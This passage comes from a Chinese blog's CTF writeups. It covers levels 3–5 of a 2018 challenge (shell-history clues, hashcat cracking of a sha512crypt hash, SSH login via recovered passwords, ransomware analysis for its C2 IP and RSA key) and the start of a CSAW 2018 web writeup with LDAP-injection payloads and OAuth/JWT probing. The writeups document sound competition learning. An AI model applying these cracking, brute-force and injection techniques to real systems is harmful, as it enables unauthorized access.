class="built_in">cd</span></span><br><span class="line">   48  useradd key P@ssword123</span><br><span class="line">   49  useradd key</span><br><span class="line">   50  passwd key</span><br><span class="line">   51  cat /etc/shadow</span><br><span class="line">   52  ls</span><br><span class="line">   53  mkdir .ssh</span><br><span class="line">   54  key 的明文密码就是下一关通关密语</span><br><span class="line">   55  <span class="built_in">exit</span></span><br><span class="line">   56  ls -la</span><br><span class="line">   57  cat .bash_history </span><br><span class="line">   58  <span class="built_in">exit</span></span><br><span class="line">   59  quit</span><br><span class="line">   60  <span class="built_in">exit</span></span><br><span class="line">   61  ls</span><br><span class="line">   62  <span class="built_in">cd</span> redis-2.8.17</span><br><span class="line">   63  ls</span><br><span class="line">   64  <span class="built_in">cd</span> sec</span><br><span class="line">   65  <span class="built_in">cd</span> src</span><br><span class="line">   66  vim  redis-server </span><br><span class="line">   67  redis-server </span><br><span class="line">   68  redis-cli -h 127.0.0.1 -p 6379 shutdown</span><br><span class="line">   69  netstat -tunlp</span><br><span class="line">   70  redis-server </span><br><span class="line">   71  netstat -tunlp</span><br><span class="line">   72  ./redis-server </span><br><span class="line">   73  redis-cli ../redis.conf &amp;</span><br><span class="line">   74  netstat -tunlp</span><br><span class="line">   75  <span class="built_in">jobs</span> </span><br><span class="line">   76  redis-server ../redis.conf &amp;</span><br><span class="line">   77  netstat -tunlp</span><br><span class="line">   78  <span class="built_in">cd</span> /home/</span><br><span class="line">   79  ls</span><br><span class="line">   80  <span class="built_in">cd</span> key/</span><br><span class="line">   81  ls</span><br><span class="line">   82  ls -al</span><br><span class="line">   83  <span class="built_in">cd</span> ..</span><br><span class="line">   84  <span class="built_in">cd</span> </span><br><span class="line">   85  <span class="built_in">cd</span> /root/</span><br><span class="line">   86  ls</span><br><span class="line">   87  passwd key</span><br><span class="line">   88  <span class="built_in">cd</span> /root/.ssh/</span><br><span class="line">   89  ls</span><br><span class="line">   90  <span class="built_in">cd</span> ..</span><br><span class="line">   91  ls</span><br><span class="line">   92  ls -al</span><br><span class="line">   93  <span class="built_in">cd</span> .ssh/</span><br><span class="line">   94  ls</span><br><span class="line">   95  ls -al</span><br><span class="line">   96  <span class="built_in">cd</span> ..</span><br><span class="line">   97  rm -rf .ssh/</span><br><span class="line">   98  <span class="built_in">cd</span> /home/</span><br><span class="line">   99  ls</span><br><span class="line">  100  <span class="built_in">cd</span> key/.ssh</span><br><span class="line">  101  mkdir key/.ssh/</span><br><span class="line">  102  <span class="built_in">cd</span> /home/</span><br><span class="line">  103  ls</span><br><span class="line">  104  <span class="built_in">cd</span> key/</span><br><span class="line">  105  <span class="built_in">cd</span> .ssh/</span><br><span class="line">  106  ls</span><br><span class="line">  107  rm authorized_keys </span><br><span class="line">  108  <span class="built_in">cd</span> </span><br><span class="line">  109  <span class="built_in">history</span> </span><br><span class="line">  110  <span class="built_in">cd</span> /home/key/.ssh/</span><br><span class="line">  111  ls</span><br><span class="line">  112  cat authorized_keys </span><br><span class="line">  113  rm authorized_keys </span><br><span class="line">  114  ls</span><br><span class="line">  115  rm authorized_keys </span><br><span class="line">  116  <span class="built_in">cd</span> ..</span><br><span class="line">  117  <span class="built_in">cd</span> </span><br><span class="line">  118  useradd <span class="built_in">test</span></span><br><span class="line">  119  useradd guest</span><br><span class="line">  120  useradd admin</span><br><span class="line">  121  useradd redis</span><br><span class="line">  122  passwd <span class="built_in">test</span></span><br><span class="line">  123  passwd guest</span><br><span class="line">  124  passwd admin</span><br><span class="line">  125  mkdir /home/admin/.ssh/</span><br><span class="line">  126  mkdir /home/<span class="built_in">test</span>/.ssh/</span><br><span class="line">  127  mkdir /home/guest/.ssh/</span><br><span class="line">  128  ls</span><br><span class="line">  129  <span class="built_in">cd</span> /home/</span><br><span class="line">  130  ls -L 1 </span><br><span class="line">  131  ls </span><br><span class="line">  132  <span class="built_in">cd</span> admin/</span><br><span class="line">  133  ls</span><br><span class="line">  134  ls -al</span><br><span class="line">  135  <span class="built_in">cd</span> ..</span><br><span class="line">  136  ls</span><br><span class="line">  137  <span class="built_in">cd</span> .</span><br><span class="line">  138  <span class="built_in">cd</span> </span><br><span class="line">  139  wget https://cowtransfer.com/s/84d80d0d7b3c45</span><br><span class="line">  140  wget https://static.cowtransfer.com/84d80d0d-7b3c-4539-932d-30c3f0869538/%E9%AB%98%E9%A2%91%E5%AD%97%E5%85%B8.zip?e=1537629504&amp;token=rkrC3sADAVnBtSQ_YTQgxi-3TEVapbu6rxmtmg0v:IDeOMk2XNjOwrk-mcTr6wnRjM84=&amp;sign=484933f3a024bcab2d8f29c659aa8aa9&amp;t=5ba65d40&amp;attname=%E9%AB%98%E9%A2%91%E5%AD%97%E5%85%B8.zip</span><br><span class="line">  141  netstat -tunlp</span><br><span class="line">  142  <span class="built_in">history</span> &gt; /tmp/<span class="built_in">history</span></span><br><span class="line">  143  <span class="built_in">cd</span> /tmp/</span><br><span class="line">  144  vim <span class="built_in">history</span> </span><br><span class="line">  145  <span class="built_in">exit</span></span><br><span class="line">  146  passwd <span class="built_in">test</span></span><br><span class="line">  147  passwd admin</span><br><span class="line">  148  passwd gue</span><br><span class="line">  149  passwd guest</span><br><span class="line">  150  <span class="built_in">history</span> &gt; /tmp/<span class="built_in">history</span></span><br></pre></td></tr></table></figure><p><code>em~</code>，我以为我找到答案了，你肯定也看到了<code>P@ssword123</code>，想多了，因为下面的命令告诉我们，大佬改了密码。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537707044424.png" alt="1537707044424"></p><p>先再看看<code>/etc/shadow</code>,<code>en~</code>，密码的<code>hash</code>值都有，不是说<code>key 的明文密码就是下一关通关密语</code>吗？那试试爆破<code>key</code>用户的<code>hash</code>值咯。结果再爆破这里，巨坑，有两种工具可以爆破，一种<code>john</code>，一种<code>hashcat</code>，<code>john</code>不知啥原因，<code>kali</code>、<code>ubuntu</code>下均报错，折腾许久，还是没弄好，就去搞鼓<code>hashcat</code>。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537707242063.png" alt="1537707242063"></p><p><code>hashcat</code>用的是<code>windows</code>版的，但是死活爆破不出来，这是我使用的是<code>john</code>的自带字典<code>rockyou.txt</code>，后面一直换字典，还是爆不出来。厚着脸皮去问出题大佬，大佬给了点提示，仔细看<code>history</code>文件，看了半天，还是没看出啥来，大佬看不下去了，字典在里面。哦~，于是我懂了。上面的<code>history</code>文件有这两条记录</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537707972635.png" alt="1537707972635"></p><p>打开<code>https://cowtransfer.com/s/84d80d0d7b3c45</code>，提示了</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537708058489.png" alt="1537708058489"></p><p>而<code>140</code>行的<code>url</code>经过<code>URLdecode</code>后是这样的<code>https://static.cowtransfer.com/84d80d0d-7b3c-4539-932d-30c3f0869538/高频字典.zip?e=1537629504&amp;token=rkrC3sADAVnBtSQ_YTQgxi-3TEVapbu6rxmtmg0v:IDeOMk2XNjOwrk-mcTr6wnRjM84=&amp;sign=484933f3a024bcab2d8f29c659aa8aa9&amp;t=5ba65d40&amp;attname=高频字典.zip</code>更是提醒我们要用这个字典去跑<code>key</code>的<code>hash</code>值，之前我也有看到这个，还打开过，但是觉得很莫名其妙，听到大佬的提示，突然悟了。是我太菜了，<code>orz</code>。</p><p>于是下载<code>高频字典.zip</code>，然后开始爆破，破破破，不知道怎么破请看<a href="https://blog.csdn.net/mydriverc2/article/details/41384853" target="_blank" rel="noopener">Hash破解神器：Hashcat的简单使用</a>，构造以下命令:</p><p><code>hashcat64.exe -m 1800 -a 0 -o found.txt crack.hash 字典.txt</code></p><p>简单描述下这条命令的意思：如果<code>hashcat</code>在<code>字典.txt</code>中跑出的hash值与<code>crack.hash</code>中所求内容相同，就将<code>字典.txt</code>找到的对应值写入<code>found.txt</code>中。</p><p>于是找啊找，跑啊跑，发现跑完刚刚下载的所有<code>高频字典.zip</code>里的文件还是没找到啊，于是自己本地建了个<code>key</code>用户测试了下，发现可以跑出来啊。感觉出题大佬被我坑了（之前直接的<code>rsdis</code>命令写入，把<code>/etc/passwd</code>写坏了），后面问了下，果然，之前的那条<code>key</code>的<code>hash</code>值是跑不出来的。额。。。自作自受啊。出题老哥后面重新给了个<code>sha512</code>的值<code>$6$ZkfV4HlR$7hk5IVzAVIq1gGLJo254qMm9LT6YrnUy7iATOTc8das8pOwGPWzKMlWTczMjp5fAyYFQ1SMe/K.FIGBAX/0590</code></p><p>执行命令：<code>hashcat64.exe -m 1800 -a 0 -o found.txt crack.hash 55泄漏门（部分）.txt</code>，秒破</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537704976981.png" alt="1537704976981"></p><p>查看<code>found</code>文件：</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537709086328.png" alt="1537709086328"></p><p>第三关最终的<code>KEY</code>：<code>1314woaini1314</code></p><p>听说后面这题是这样的，觉得难度就应该降低挺多的了</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537710176564.png" alt="1537710176564"></p><h4 id="Level-4"><a href="#Level-4" class="headerlink" title="Level_4"></a>Level_4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜完成第三关，第四关的入口是：</span><br><span class="line"></span><br><span class="line">http://zuohaoyingjixiangyinghennan.xazlsec.com</span><br><span class="line"></span><br><span class="line">获得 key 之后，通过后台发送 key 将获得第五关的入口信息，祝你好运！</span><br></pre></td></tr></table></figure><p>打开网页是这样的（我刚做这题的时候，页面是没有任何消息的，摸索好一阵子）</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537746165267.png" alt="1537746165267"></p><p>打开网址<code>https://cowtransfer.com/s/023ab1f54dd04c</code>，提供了一个压缩包<code>HellWorld.pcapng</code>进行下载。</p><p><code>wireshark</code>三板斧试下，很快就会发现其中的<code>http</code>流存在提示，有个压缩包，里面有私钥和公钥文件。除此之外明确，攻击者内网<code>ip：10.0.3.111</code>，被攻击<code>ip：173.82.235.146</code>（攻击者的外网<code>ip</code>：<code>182.150.21.33</code>，估计出题老哥这题是在虚拟机抓的，所以会有内外网ip）</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537978806267.png" alt="1537978806267"></p><p>而分组<code>10061</code>和<code>10956</code>则分析出以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://dynupdate.noip.com/settings.php?username=C3A37087469&amp;pass=HMAC&#123;yuyvphyx4snkqvtgt7kiyiamtra=&#125;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;noip_host_list email=&quot;C3A37087469&quot; enhanced=&quot;false&quot; webserver=&quot;&quot;&gt;</span><br><span class="line">  &lt;domain name=&quot;ddns.net&quot; type=&quot;free&quot;&gt;</span><br><span class="line">    &lt;host name=&quot;cherishao&quot; group=&quot;&quot; wildcard=&quot;false&quot;/&gt;</span><br><span class="line">  &lt;/domain&gt;</span><br><span class="line">&lt;/noip_host_list&gt;</span><br><span class="line"></span><br><span class="line">http://dynupdate.noip.com/ducupdate.php?username=C3A37087469&amp;h[]=cherishao.ddns.net&amp;ip=182.150.21.33&amp;pass=HMAC&#123;qq6tthdbubqfp7d+t0wrgo6pykg=&#125;</span><br></pre></td></tr></table></figure><p>其中有个<code>username=C3A37087469</code>，这个是接下来的线索。另外，值得一提的是<code>passwd.jpg</code>这个图片，这个<code>http</code>传输载体<code>tcp</code>传输时，存在丢包现象，所以单纯的<code>http</code>流追踪是找不到回应的包，只能通过追踪<code>tcp</code>流查找重传的数据。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537979013881.png" alt="1537979013881"></p><p>很明显，是个图片，不过是<code>base64</code>格式，这个需要自行通过<code>html</code>标签<code>img</code>使图片显示在网页中，操作一番，如下</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537979226469.png" alt="1537979226469"></p><p>好的，我们现在得到了<code>*mGX3Y-d</code>。再仔细看看题目还有个神秘代码，<code>UJxgqdNUuH2I5EDDXgXvhFleJiVxeOvZBLXiLJ3lTq+lTRg7eSMR4++CZwe2z7vFh5CqETYeoZ7fAUWT4iCMMuap2iG/OfbKV2JN2SFrpCKCmSfnlxKIF02KTUyI99Ip/06LtNlmAIBtWisi0Ijr67lq+2HKQgxu5KaaNQpzohk=</code></p><p>这个通过之前压缩包中的<code>rsa</code>私钥文件直接解密，会得到以下内容<code>eK8}vD3=</code>。</p><p>好的做到这里，我有话要讲，那个时候，再看了下题目</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537979709788.png" alt="1537979709788"></p><p>再联系上面得到的消息，我用<code>ubuntu</code>的<code>ssh</code>服务尝试爆破了<code>207.148.27.120</code>的<code>22</code>端口，其中爆破字典我选择了<code>top</code>前<code>100</code>的弱密码，并且添加了<code>*mGX3Y-deK8}vD3=</code>、<code>eK8}vD3=*mGX3Y-d</code>这两个密码进去，但是爆破没结果。而真相是，过了一天，我用<code>xshell</code>再次连接时，直接<code>root</code>用户，再以<code>eK8}vD3=*mGX3Y-d</code>登进去了，登进去了。（这里之前问了出题老哥，老哥说设置了<code>ssh</code>验证次数为<code>5</code>次，猜测是不是这个原因导致<code>ubuntu</code>的<code>hydra</code>没有成功爆破）</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537882454775.png" alt="1537882454775"></p><p>密码是<code>eK8}vD3=*mGX3Y-d</code></p><p>登录成功后，第一件事就是查看<code>history</code>，还是发现了一些东西，比如说<code>icmpsh_m.py</code>，刚开始以为这个是<code>linux</code>提权的后门，理直气壮去找老哥，老哥说不是这个。好吧继续找。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537884117551.png" alt="1537884117551"></p><p>然后往下翻翻看到了这个</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537980328352.png" alt="1537980328352"></p><p>有个很明显的目录<code>/etc/ssh/</code>，下载了个<code>XAZLER.exe</code></p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537978124473.png" alt="1537978124473"></p><p>打开后是这样的</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537980446285.png" alt="1537980446285"></p><p>细心的你们一定发现，上面有提示“请按任意键继续”，嗯，但是我没按，直接关掉了（那个时候我只要多按下任意一个键，<code>key</code>就会出来）。然后我又继续往下探索，发现了存在一个<code>C3A37087469</code>的用户，咦！</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537886964567.png" alt="1537886964567"></p><p>其中有个<code>key.sh</code>，打开看下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#@Cherishao </span><br><span class="line"></span><br><span class="line">echo “Good job!!&quot;</span><br><span class="line"></span><br><span class="line">:) Congratulations, you have come here. </span><br><span class="line"></span><br><span class="line">   However, you need a higher level of permissions！！！</span><br><span class="line"></span><br><span class="line">   It is said that higher privilege passwords are more complicated(16bit).</span><br></pre></td></tr></table></figure><p>到这里，想了好久还是没思路，厚着脸皮去问出题老哥，发了一些解题截图过去，老哥说：“你是不是傻啊，再随便按个键啊”，然后就是下面这个样子（<code>tm</code>内心一万匹草泥马飞奔）</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537886544690.png" alt="1537886544690"></p><p>好吧，得到了<code>key</code>，下一关的钥匙。</p><p>在其中的解题过程中，此题的出题老哥，教了我好些应急响应、溯源等知识，贼喜欢。</p><p>这里放个学习链接：<a href="https://www.leiphone.com/news/201706/oCidY2C8IPHt82mF.html" target="_blank" rel="noopener">干货 | 黑客入侵？这里有详细的应急排查手册！</a></p><p>解题过程中，老哥为了加快我们的解题速度，还放出了个提示：</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537887293053.png" alt="1537887293053"></p><p>后面做完题，感觉这提示没啥用啊。后面问了下</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537981121231.png" alt="1537981121231"></p><p>好吧，的确有这样的想法，当时我记得<code>ip</code>反查都试了一遍。</p><h4 id="Level-5"><a href="#Level-5" class="headerlink" title="Level_5"></a>Level_5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">恭喜完成第四关，第五关是一个病毒分析题，样本下载地址：</span><br><span class="line"></span><br><span class="line">https://pan.baidu.com/s/1mngKICMpg4nSekfBp0qpPw        密码：fbox</span><br><span class="line"></span><br><span class="line">本题有两个问题：</span><br><span class="line"></span><br><span class="line">1：RSA公钥是什么？</span><br><span class="line"></span><br><span class="line">2: 黑客服务器的IP地址是什么？</span><br></pre></td></tr></table></figure><p>这题啊，大家解压压缩包的时候千万小心，这是个真的病毒，嗯~，还好我放在虚拟机里了，不然，物理机得遭殃。</p><p>看到了题目，想了想，有点意思啊，还问<code>黑客服务器的IP地址是什么？</code>。玩玩呗，虚拟机运行下这个病毒软件，发现文件数据被加密了，还发现了这个</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537981472145.png" alt="1537981472145"></p><p>然后我就去下载<code>onion</code>浏览器了，弄了半天没弄好，去问出题老哥，我觉得那个时候老哥都被我逗笑了。</p><p>然后老哥给了提示，抓包，这个其实也想到了，但是想归想到，操作起来发现巨坑，因为病毒传送信息的服务器炸了，导致抓包的时候没有看到<code>http</code>流，后面仔细看了半天，才找到下图的线索。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537954753559.png" alt="1537954753559"></p><p>是的，黑客服务器的IP地址就是<code>137.74.163.43</code>，就是这么简单。但是让我头疼的是第一个问题，<code>rsa</code>的公钥是啥？我滴个天啊，摆明要逆向啊。去问问出题老哥有没其他做法，老哥指点了一条明路：<strong>内存提串</strong>，后面使用了<code>火绒剑</code>，这个工具，贼好用。仔细分析了很久，火绒剑监控一下，就能看到这个病毒<code>exe</code>相应的行为了，在其运行完毕后，最终还会释放一个<code>PE</code>，而这个<code>PE</code>是没有任何混淆的，可以清晰使用<code>IDA</code>查看到其中的<code>RSA</code>公钥。当然其中需要<code>dump</code>一下，这里请教了下出题老哥：<strong><code>OD</code>本身能<code>dump</code>，<code>PEtoolS</code>，<code>loadPE</code>也都能dump。</strong>好吧，那就<code>dump</code>一下，<code>dump</code>出来后，直接扔到<code>IDA</code>中，得到<code>RSA</code>公钥</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537963593632.png" alt="1537963593632"></p><p>得到的最后<code>RSA</code>公钥为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyvXYYjSQqu7nWxB8HH/9SIaTd ZZ5Es9nv2KQnPcUV6F0ZHITClTZvoa7PbtG77q76xBNdvTH8VIXGjn+d58xK8jlE krC/N87iWPpG0jgmeY/ytR/gyArojmDFFnt11WP2koi2sjWzz1UXv8SC/aHHqfHe wgWrhFLmlhxrBxo46wIDAQAB -----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>黑客服务器<code>ip：137.74.163.43</code></p><p>这里有个尴尬的地方，因为我是先拿到<code>ip</code>，提交答案后，直接“完成所有挑战”，后面跟出题老哥反映下，再继续去找公钥的答案。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537978300052.png" alt="1537978300052"></p><p>到此结束，大佬们，再见。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;拿了首届信安之路巅峰挑战赛第一，这次比赛的&lt;code&gt;writeup&lt;/code&gt;如下，&lt;code&gt;orz&lt;/code&gt;，&lt;code&gt;orz&lt;/code&gt;。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018中秋节随记</title>
    <link href="https://jianghuxia.github.io/2018/09/24/2018%E4%B8%AD%E7%A7%8B%E8%8A%82%E9%9A%8F%E8%AE%B0/"/>
    <id>https://jianghuxia.github.io/2018/09/24/2018中秋节随记/</id>
    <published>2018-09-24T13:18:59.000Z</published>
    <updated>2018-09-24T13:44:36.171Z</updated>
    
    <content type="html"><![CDATA[<p>今天中秋节，祝大佬们开开心心，阖家幸福，一首穷开心，祝大家天天开开心心，每天都是双倍的开心。</p><a id="more"></a> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=460315810&auto=1&height=66"></iframe><p>给大佬们递月饼</p><p><img src="http://www.hinews.cn/pic/003/018/766/00301876635_81ca3222.jpg" alt="img"></p><p>中秋，快乐，晚安！</p><p><img src="http://imgtianqi.eastday.com/res/upload/ue/image/20180919/1537339676661267.png" alt="2018éåä¸­ç§èæè¯µçè¯æ­ ä¸­ç§èå¤è¯è¯åå¥å¤§å¨è´ºå¡ç¥ç¦è¯­"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天中秋节，祝大佬们开开心心，阖家幸福，一首穷开心，祝大家天天开开心心，每天都是双倍的开心。&lt;/p&gt;
    
    </summary>
    
    
      <category term="life" scheme="https://jianghuxia.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>CSAW CTF Qualification Round 2018 Writeup</title>
    <link href="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/"/>
    <id>https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/</id>
    <published>2018-09-24T07:33:44.000Z</published>
    <updated>2018-09-24T07:41:49.980Z</updated>
    
    <content type="html"><![CDATA[<p>这次的web做的贼舒服，难度高，学的东西特别多，贼虚服。最近不是懒，是真忙，17号的黑盾，前前后后忙了四天，<code>writeup</code>后面最近才补全，福州这个去了好多次的城市，感慨颇多啊。</p><a id="more"></a> <h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h4><h5 id="Ldab-ldab注入——还需理解学习"><a href="#Ldab-ldab注入——还需理解学习" class="headerlink" title="Ldab(ldab注入——还需理解学习)"></a>Ldab(ldab注入——还需理解学习)</h5><p><em>dab</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.chal.csaw.io:8080</span><br></pre></td></tr></table></figure><p>这题，额，不难啊，之前noxctf做过一题<code>ldab</code>注入的题目<code>Dictionary of obscure sorrows</code>，大体类似。</p><p>刚开始做的时候，没注意到<code>ldab</code>，发现<code>sql</code>注入无果，后面还是看到OU、CN、SN、GivenName、UID，才反应过来。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537272110586.png" alt="1537272110586"></p><p>测试一波，发现Flag就是查不到，猜测后台过滤语句为：</p><p><code>&quot;(&amp;(GivenName=&quot; + $_GET[&#39;search&#39;] + &quot;)(GivenName!=Flag))&quot;</code></p><p>因此构造语句<code>$_GET[&#39;search&#39;]</code>=<code>&quot;Flag))(|(GivenName=*&quot;</code>，使得<code>&quot;(&amp;(GivenName=Flag))(|(GivenName=*&quot;)(GivenName!=Flag))&quot;</code>为永真条件即可。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537272522589.png" alt="1537272522589"></p><p>不过，后面发现构造<code>*)(uid=*))(|(uid=*</code>也是可以的。</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537272844469.png" alt="1537272844469"></p><h5 id="sso（篡改Token——还需理解学习）"><a href="#sso（篡改Token——还需理解学习）" class="headerlink" title="sso（篡改Token——还需理解学习）"></a>sso（篡改Token——还需理解学习）</h5><p><code>Don&#39;t you love undocumented APIs</code></p><p><code>Be the admin you were always meant to be</code></p><p><code>http://web.chal.csaw.io:9000</code></p><p><code>Update chal description at: 4:38 to include solve details</code></p><p><code>Aesthetic update for chal at Sun 7:25 AM</code></p><p>打开网页，查看源代码</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537273716451.png" alt="1537273716451"></p><p>尝试访问<code>http://web.chal.csaw.io:9000/protected</code>，回显<code>Missing header: Authorization</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274035389.png" alt="1537274035389"></p><p>尝试访问<code>/oauth2/token</code>，回显<code>Not Found</code>，尝试提交空post数据，弹出<code>incorrect grant_type</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274187039.png" alt="1537274187039"></p><p>尝试访问<code>oauth2/authorize</code>，回显是<code>Not Found</code>，尝试提交空post数据，弹出<code>response_type not code</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537273623996.png" alt="1537273623996"></p><p>也就是说两个提示<code>post</code>请求方式的<code>url</code>还是缺少其他参数才能得到我们想要的回显，但是我不知道要提交啥头啊。后面做了其他题回头再看，看到<code>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!</code>，搜索了下<code>OAUTH2.0</code>，果然找到了一些相关的<code>rfc</code>文档—— <a href="https://tools.ietf.org/html/rfc6750" target="_blank" rel="noopener">RFC-6750</a>和 <a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener">RFC-6749</a> （或者<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">这个</a>）</p><p>其中<code>rfc6749</code>有这么一个说明，好像懂了啥</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274553787.png" alt="1537274553787"></p><p>后面构造<code>oauth2/authorize</code>的<code>post</code>数据<code>response_type=code&amp;redirect_uri=http://web.chal.csaw.io:9000/protected</code>，发现有个<code>302</code>的跳转</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537278198873.png" alt="1537278198873"></p><p>也就是这些内容</p><p><code>Redirecting to &lt;a href=&quot;http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s&amp;amp;state=&quot;&gt;http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s&amp;amp;state=&lt;/a&gt;.</code></p><p>打开<code>http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s&amp;amp;state=</code>看看，发现回显还是<code>Missing header: Authorization</code></p><p>那很好，估计现在是<code>/oauth2/token</code>的问题了，其实思路很明确了，JWT伪造。</p><p>刚刚尝试访问<code>/oauth2/token</code>，回显<code>Not Found</code>，尝试提交空post数据，弹出<code>incorrect grant_type</code>，那么我们查查<code>grant_type</code>改改成啥玩意呢，在<code>rfc6749</code>中有以下内容</p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537275650034.png" alt="1537275650034"></p><p>所以我们设置成<code>grant_type=authorization_code</code>，接着尝试构造<code>post</code>请求数据<code>grant_type=authorization_code&amp;redirect_uri=http://web.chal.csaw.io:9000/protected</code>，提交发现</p><p>回显是<code>Missing parameters</code></p><p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537275905514.png" 